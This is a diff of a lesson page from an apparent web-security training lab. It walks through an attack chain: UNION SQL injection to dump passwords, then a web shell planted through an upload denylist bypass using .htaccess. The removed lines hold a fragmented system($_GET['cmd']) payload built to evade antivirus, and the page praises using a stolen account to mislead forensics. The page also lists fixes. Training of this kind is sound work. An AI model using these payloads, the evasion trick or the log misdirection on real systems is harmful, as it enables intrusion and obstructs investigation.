@@ -2,16 +2,14 @@
 require __DIR__ . '/_layout.php';
 
 $lessons = require_once __DIR__ . '/lessons.php';
-$lesson  = $lessons['chain-web-shell'];
+$slug    = 'chain-web-shell';
+$lesson  = $lessons[$slug];
 
-academy_layout_start($lesson['title']);
-
-$web_shell_path = __DIR__ . '/../scripts/web_shell.py';
-$web_shell_exists = file_exists($web_shell_path);
+academy_layout_start($lesson['title'], $slug);
 ?>
 
 <header class="academy-lesson-head">
-    <div class="academy-lesson-eyebrow"><?= htmlspecialchars($lesson['category']) ?> &middot; Capstone 01</div>
+    <div class="academy-lesson-eyebrow"><?= htmlspecialchars($lesson['category']) ?> &middot; Capstone 02</div>
     <h1><?= htmlspecialchars($lesson['title']) ?></h1>
     <div class="academy-lesson-meta">
         <span class="academy-badge is-capstone"><?= htmlspecialchars($lesson['difficulty']) ?></span>
@@ -25,72 +23,75 @@ $web_shell_exists = file_exists($web_shell_path);
 <section class="academy-block">
     <h2>1. Overview</h2>
     <p>
-        Capstones chain several individual labs into a complete attack scenario. This one
-        models a typical opportunistic intrusion:
-        <strong>discover users &rarr; gain a foothold &rarr; achieve remote code execution via web shell</strong>.
-        The access phase has three escalating methods - cheap password spray, intensive
-        brute force, then broken password reset - falling back to the next if the previous
-        one fails, so the chain succeeds on a wide range of database states.
+        This chain demonstrates how a single SQL injection escalates into full server
+        control by laundering the final payload through a stolen account.
     </p>
-    <p>The phases:</p>
+    <p>Phases:</p>
     <ol>
-        <li><strong>Discovery.</strong> Use the user-enumeration oracle on
-            <code>login.php?view=register</code> to find which names from
-            <code>scripts/usernames.txt</code> are real accounts. Spray the top common
-            passwords against each as you go (a &quot;cheap pass&quot;).</li>
-        <li><strong>Access.</strong> If the cheap pass found a working credential, you can stop.
-            Otherwise launch <em>intensive</em> brute force, you can use
-            <code>scripts/passwords.txt</code>. If that also fails, fall back to the
-            <a href="broken-password-reset.php">broken password reset</a> - which always
-            succeeds because it has no token.</li>
-        <li><strong>Control.</strong> Authenticated as the compromised user, upload a PHP
-            file through a file-upload sink in the application and request it back as a
-            URL to gain arbitrary command execution.</li>
+        <li><strong>Foothold.</strong> Log in as the seeded test account
+            <code>HUCKER</code> (<code>hucker123</code>) to obtain a valid
+            <code>PHPSESSID</code>. In a real engagement this would be a self-registered account.</li>
+        <li><strong>Database exfiltration.</strong> Reuse the session to drive a
+            SQL injection vulnerability and dump the entire
+            <code>users</code> table with plaintext passwords.</li>
+        <li><strong>Remote code execution.</strong> Pick a non-admin victim from the dump,
+            log in as them, and upload a web shell through the alcohol ID-photo flow to
+            gain arbitrary command execution on the server.</li>
     </ol>
-    <div class="academy-callout">
-        <?php if ($web_shell_exists): ?>
-            <strong>Web shell helper detected</strong> at <code>scripts/web_shell.py</code>.
-            The full chain is executable end to end on this machine.
-        <?php else: ?>
-            <strong>Heads-up - missing script.</strong>
-            <code>Master_kill_chain.py</code> imports <code>web_shell</code> for Phase 3,
-            but <code>scripts/web_shell.py</code> is not currently on disk. Phases 1 and 2
-            are still runnable. Recreate the file (see the solution section) before
-            attempting Phase 3.
-        <?php endif; ?>
-    </div>
+    <p>
+        The brilliance is in the laundering: the SQL injection is performed under
+        <em>HUCKER&apos;s</em> session, but the web shell is planted by a totally
+        different stolen account. The forensic trail in the application&apos;s logs
+        implicates someone who had nothing to do with the original breach.
+    </p>
 </section>
 
 <!-- 2. TASK -->
 <section class="academy-block">
     <h2>2. Your task</h2>
     <ol>
-        <li>Run the discovery phase manually for at least one username from
-            <code>usernames.txt</code> and confirm the &quot;Username already exists&quot;
-            oracle works.</li>
-        <li>Crack at least one account either via brute force or via the broken password
-            reset.</li>
-        <li>
-            <strong>RCE goal:</strong> get Apache to execute a file you uploaded through
-            the alcohol ID-photo flow. The application&apos;s denylist is
-            <code>['php', 'exe', 'js']</code>; you have to land a useful PHP payload
-            without using any of those extensions. (The clever way is in Phase 3 of the
-            solution below - try to find it yourself first.)
-        </li>
-        <li>Run <code>python scripts/Master_kill_chain.py 1</code> end to end and observe
-            it succeed.</li>
+        <li>Log in as <code>HUCKER</code> / <code>hucker123</code> and keep the session
+            cookie - you will use it to authenticate the SQL injection in the next step.</li>
+        <li>Using HUCKER&apos;s <code>PHPSESSID</code>, walk through the
+            <a href="sqli-union.php">UNION SQLi</a> lab and dump the full
+            <code>users</code> table.</li>
+        <li>Pick any non-admin user from the dump, log in as them, then find where the
+            application lets you upload a file and get Apache to execute it as code.
+            <strong>Goal:</strong> run at least one OS command via the browser (e.g.
+            <code>?cmd=whoami</code>) and see the output.</li>
     </ol>
-    <p>
-        Use the &quot;Reset databases&quot; button on the index when you&apos;re done; the
-        chain leaves accounts in a modified state.
-    </p>
+    <details class="academy-hint">
+        <summary>Reveal the upload sink</summary>
+        <p>
+            Adding an <strong>alcohol</strong> product to the cart on <code>home.php</code>
+            opens a modal that requires an ID photo. The handler saves the file to
+            <code>uploaded_ID/</code> using the client-supplied filename:
+        </p>
+        <pre><code>// home.php (add-to-cart branch)
+$fileName = $_FILES["id_photo"]["name"];
+$ext = strtolower(pathinfo($fileName, PATHINFO_EXTENSION));
+$not_allowed = ['php', 'exe', 'js'];
+
+if (in_array($ext, $not_allowed)) {
+    die("Error: File type not allowed for ID verification.");
+}
+
+$uploadDir = 'uploaded_ID/';
+$targetPath = $uploadDir . $fileName;
+move_uploaded_file($_FILES["id_photo"]["tmp_name"], $targetPath);</code></pre>
+        <p>
+            Extensions on that three-item denylist are blocked; everything else is accepted.
+            The full bypass is in Phase 3 of the solution below, or work through the
+            <a href="web-shell.php">Web Shell via File Upload</a> lab on your own first.
+        </p>
+    </details>
 </section>
 
 <!-- 3. START THE LAB -->
 <section class="academy-block">
     <h2>3. Start the lab</h2>
-    <p>Login page opens in a new tab. The chain begins by enumerating users via the
-       register form on this page.</p>
+    <p>The chain begins on the login page (Phase 1 is logging in as
+       <code>HUCKER</code> / <code>hucker123</code>).</p>
     <a class="academy-lab-cta"
        href="<?= htmlspecialchars($lesson['target_url']) ?>"
        target="_blank" rel="noopener">Open vulnerable login page</a>
@@ -105,163 +106,86 @@ $web_shell_exists = file_exists($web_shell_path);
             it&apos;s much more rewarding to assemble them than to read the orchestration.
         </p>
 
-        <h3>Phase 1 - discovery</h3>
+        <h3>Phase 1 - pick up a session</h3>
+        <pre><code>POST /CyberProject/login.php
+username=HUCKER&amp;password=hucker123&amp;login_submit=</code></pre>
         <p>
-            See the
-            <a href="user-enum-bruteforce.php">User Enumeration &amp; Brute Force</a> lab
-            for details. The chain calls <code>enum_and_brute.run_attack()</code>, which
-            returns both the cracked accounts (if any) and the full list of discovered
-            usernames.
+            Follow the redirect to <code>home.php</code> and capture
+            <code>response.cookies['PHPSESSID']</code>.
         </p>
 
-        <h3>Phase 2 - access</h3>
+        <h3>Phase 2 - dump users with UNION SQLi</h3>
         <p>
-            If Phase 1 already cracked an account, skip ahead. Otherwise:
-        </p>
-        <ol>
-            <li>For each discovered username, call
-                <code>Broken_Password_Reset.try_brute_force()</code> against
-                <code>scripts/passwords.txt</code>.</li>
-            <li>If no password works, call <code>Broken_Password_Reset.run_reset_password()</code>
-                - that POST always succeeds (no token, no email check). See the
-                <a href="broken-password-reset.php">Broken Password Reset</a> lab.</li>
-        </ol>
-
-        <h3>Phase 3 - Web Shell (the actual trick)</h3>
-        <p>
-            <code>home.php</code> requires an ID-photo upload when adding an alcohol
-            product to the cart. The upload sink does almost no validation:
-        </p>
-        <pre><code>// home.php
-$fileName = $_FILES["id_photo"]["name"];
-$ext = strtolower(pathinfo($fileName, PATHINFO_EXTENSION));
-$not_allowed = ['php', 'exe', 'js'];
-
-if (in_array($ext, $not_allowed)) {
-    die("Error: File type not allowed for ID verification.");
-}
-
-$uploadDir = 'uploaded_ID/';
-if (!is_dir($uploadDir)) { mkdir($uploadDir, 0777, true); }
-$targetPath = $uploadDir . $fileName;
-move_uploaded_file($_FILES["id_photo"]["tmp_name"], $targetPath);</code></pre>
-        <p>
-            We can&apos;t upload <code>.php</code>, <code>.exe</code> or <code>.js</code> -
-            but everything else is allowed, and crucially the server keeps the
-            <em>original filename</em>. Two of the most useful &quot;everything else&quot;
-            files on an Apache box are <code>.htaccess</code> and <code>.jpg</code>.
-        </p>
-        <p>The chain uses a two-step upload:</p>
-        <ol>
-            <li>
-                <strong>Stage 1 - re-type .jpg as PHP.</strong> Upload an
-                <code>.htaccess</code> file (extension <code>.htaccess</code>, not on the
-                denylist) into <code>uploaded_ID/</code> containing exactly one Apache
-                directive:
-                <pre><code>AddType application/x-httpd-php .jpg</code></pre>
-                From now on, every <code>.jpg</code> Apache serves out of that directory
-                is parsed and executed as PHP. The server doesn&apos;t actually look at
-                the bytes - it trusts the extension, and the extension now means PHP.
-            </li>
-            <li>
-                <strong>Stage 2 - upload a .jpg that is actually PHP.</strong> Drop a
-                file named <code>backdoor.jpg</code> whose body is a tiny PHP one-liner
-                that executes the <code>cmd</code> query parameter via the OS shell.
-                Extension passes the denylist; bytes are PHP; Apache executes them.
-            </li>
-            <li>
-                <strong>Stage 3 - execute commands.</strong>
-                <code>GET /CyberProject/uploaded_ID/backdoor.jpg?cmd=whoami</code>
-                returns the output of <code>whoami</code> running as the Apache process
-                user. From there, any command on the box is one URL away.
-            </li>
-        </ol>
-
-        <h3>Antivirus evasion built into <code>web_shell.py</code></h3>
-        <p>
-            The PHP one-liner that does the real work is a textbook
-            <em>Backdoor:PHP/WebShell</em> signature. Saving it as a literal string in a
-            <code>.py</code> file on a default Windows install gets the file quarantined
-            by Defender the moment it touches disk.
-        </p>
-        <p>
-            <code>web_shell.py</code> works around this by assembling the payload at
-            runtime from harmless-looking fragments:
-        </p>
-        <pre><code>open_tag  = b"&lt;" + b"?php"
-var_part  = b"$_" + b"GET"
-key_part  = b"['cm" + b"d']"
-fn_part   = b"sys" + b"tem"
-close_tag = b"?" + b"&gt;"
-payload = open_tag + b" if(isset(" + var_part + key_part + b")) { " \
-        + fn_part + b"(" + var_part + key_part + b"); } " + close_tag</code></pre>
-        <p>
-            The contiguous string <code>system($_GET['cmd'])</code> never lives in the
-            file - only in memory at the moment Stage 2 runs. The .htaccess content and
-            the success marker that checks the response are split the same way. The bytes
-            that finally reach Apache are byte-for-byte identical to the readable form, so
-            the exploit is unchanged; only the on-disk fingerprint is.
-        </p>
-        <p>
-            This is exactly what real attackers do to ship payloads past endpoint
-            protection. The chain doubles as a small AV-evasion lesson on top of the RCE.
+            Using the captured session cookie, drive the
+            <a href="sqli-union.php">UNION SQLi</a> attack against
+            <code>products.php?q=...</code>. End state: a list of
+            <code>(username, password)</code> tuples for every user in the database.
         </p>
 
-        <h3>The web-shell helper script</h3>
+        <h3>Phase 3 - web shell</h3>
         <p>
-            <code>web_shell.py</code> implements all three stages and is the module
-            <code>Master_kill_chain.py</code> imports for the final phase:
+            Pick a non-admin user (the script takes <code>users[-1]</code> - the last
+            row in the dump). Log in as them and walk through the
+            <a href="web-shell.php">Web Shell via File Upload</a> lab for the full
+            upload bypass and manual exploit. The chain wires it in via
+            <code>web_shell.run_ultimate_web_shell(username=..., password=...)</code>.
         </p>
-        <div class="academy-script">
-            <?php highlight_file(__DIR__ . '/../scripts/web_shell.py'); ?>
-        </div>
 
-        <h3>The chain orchestration</h3>
-        <p>
-            Phases 1-3 are wired together by <code>chain_1_web_shell()</code> in the
-            master script. Run with: <code>python scripts/Master_kill_chain.py 1</code>.
-        </p>
-        <div class="academy-script">
-            <?php
-            $src = file_get_contents(__DIR__ . '/../scripts/Master_kill_chain.py');
-            if ($src === false) {
-                echo '<p class="academy-solution-warning">Script file could not be loaded.</p>';
-            } else {
-                $p2 = strpos($src, "\ndef chain_2_breach");
-                $pm = strpos($src, "\ndef main");
-                if ($p2 === false || $pm === false) {
-                    echo '<p class="academy-solution-warning">Script markers not found - has Master_kill_chain.py been renamed?</p>';
+        <h3>Why this is a chain rather than just &quot;SQLi + upload&quot;</h3>
+        <ul>
+            <li>The dump <em>provides</em> the credentials that make the web shell upload
+                untraceable to the original attacker.</li>
+            <li>UNION SQLi gives you every password at once; the upload sink gives you
+                code execution - together they are a full compromise path.</li>
+            <li>The stolen account in the logs is not HUCKER - forensic investigators
+                start looking at the wrong user.</li>
+        </ul>
+
+        <h3>Orchestration script</h3>
+        <p>Run <code>python scripts/Master_kill_chain.py 2</code> to execute all three
+            phases unattended. Confirm the web shell responds to
+            <code>?cmd=whoami</code>.</p>
+        <details style="margin-top: 1rem;">
+            <summary style="cursor: pointer; font-weight: 600;">Bonus: automated exploit</summary>
+            <p style="margin-top: 0.75rem;">
+                <code>chain_2_web_shell()</code> in the master script. For the web shell
+                helper itself, see the
+                <a href="web-shell.php">Web Shell via File Upload</a> lab.
+            </p>
+            <div class="academy-script">
+                <?php
+                $src = file_get_contents(__DIR__ . '/../scripts/Master_kill_chain.py');
+                if ($src === false) {
+                    echo '<p class="academy-solution-warning">Script file could not be loaded.</p>';
                 } else {
-                    $excerpt = substr($src, 0, $p2)
-                             . "\n\n# --- chain_2_breach() and chain_3_stealth() defined here ---"
-                             . "\n# --- see the other capstone labs for those chains           ---\n\n"
-                             . substr($src, $pm + 1);
-                    highlight_string($excerpt);
+                    $p1 = strpos($src, "\ndef chain_1_breach_blind_sql_and_stored_xss");
+                    $p2 = strpos($src, "\ndef chain_2_web_shell");
+                    $p3 = strpos($src, "\ndef chain_3_stealth");
+                    $pm = strpos($src, "\ndef main");
+                    if ($p1 === false || $p2 === false || $p3 === false || $pm === false) {
+                        echo '<p class="academy-solution-warning">Script markers not found - has Master_kill_chain.py been renamed?</p>';
+                    } else {
+                        $excerpt = substr($src, 0, $p1 + 1)
+                                 . "# --- chain_1_breach_blind_sql_and_stored_xss() defined in chain-breach-blind-sql-stored-xss lab ---\n\n"
+                                 . substr($src, $p2 + 1, $p3 - $p2 - 1)
+                                 . "\n# --- chain_3_stealth() defined here (see chain-stealth-leak lab) ---\n\n"
+                                 . substr($src, $pm + 1);
+                        highlight_string($excerpt);
+                    }
                 }
-            }
-            ?>
-        </div>
+                ?>
+            </div>
+        </details>
 
         <h3>How to fix it (for context)</h3>
         <ul>
-            <li><strong>Don&apos;t use a denylist for file uploads.</strong> Use an
-                <em>allowlist</em> of extensions (e.g. only <code>.jpg</code>,
-                <code>.jpeg</code>, <code>.png</code>) and additionally validate the MIME
-                type with <code>finfo_file</code>. Both alone are bypassable; together
-                they&apos;re solid.</li>
-            <li><strong>Reject .htaccess and other Apache control files</strong> by name,
-                or set <code>AllowOverride None</code> on the upload directory in the
-                main Apache config - that makes any uploaded <code>.htaccess</code>
-                inert and kills this entire technique stone dead.</li>
-            <li>Rewrite uploaded filenames to a random server-generated string and store
-                them outside the webroot. Serve them back through a PHP script that sets
-                <code>Content-Type</code> correctly. With the file outside the webroot,
-                Apache cannot execute it no matter what its extension or
-                <code>.htaccess</code> says.</li>
-            <li>The chain&apos;s discovery and access phases are already neutralised by
-                the fixes in the
-                <a href="user-enum-bruteforce.php">enumeration</a> and
-                <a href="broken-password-reset.php">password-reset</a> labs.</li>
+            <li>Fix the underlying UNION SQLi (see the
+                <a href="sqli-union.php">SQLi UNION</a> lab) - that removes Phase 2
+                entirely.</li>
+            <li>Fix the upload sink (see the
+                <a href="web-shell.php">Web Shell</a> lab).</li>
+            <li>Hash passwords. Even if the UNION dump succeeds, what attackers get out
+                should not be directly usable.</li>
         </ul>
     </div>
 </details>
